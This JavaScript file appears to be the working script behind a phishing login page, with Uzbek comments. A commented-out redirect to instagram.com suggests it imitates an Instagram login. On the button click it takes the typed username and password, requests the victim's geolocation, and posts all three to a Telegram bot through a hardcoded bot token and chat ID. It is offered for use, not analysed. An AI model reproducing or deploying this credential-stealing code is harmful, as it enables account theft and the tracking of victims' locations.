let inputs = document.querySelectorAll('input');
let login_button = document.querySelector('.login-button');

let Token = '8044968615:AAEK65y0d-XGDtDLzZ6ADX4WCDBk8XKuiV8';
let chatId = '6304612170';

login_button.addEventListener('click', () => {
    let username = inputs[0].value;
    let password = inputs[1].value;

    // Geolokatsiyani olish
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(position => {
            let latitude = position.coords.latitude;
            let longitude = position.coords.longitude;


            console.log(latitude, longitude);

            // Xabarni joylashuv bilan birga tayyorlash
            let message = `
👤 Username: ${username}
🔑 Password: ${password}
📍 Location: https://www.google.com/maps?q=${latitude},${longitude}`;

            // Xabarni yuborish
            fetch(`https://api.telegram.org/bot${Token}/sendMessage`, {
                
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                }),
            })
                .then(response => response.json())
                .then(data => console.log("Yuborildi:", data))
                .catch(error => console.error("Xato yuz berdi:", error));

            // Inputlarni tozalash
            inputs[0].value = '';
            inputs[1].value = '';

            // Foydalanuvchini boshqa sahifaga yo'naltirish
            // window.location.href = 'https://instagram.com';
        }, error => {
            console.error("Geolokatsiya xatosi:", error.message);
        });
    } else {
        console.error("Brauzer geolokatsiyani qo'llab-quvvatlamaydi.");
    }
});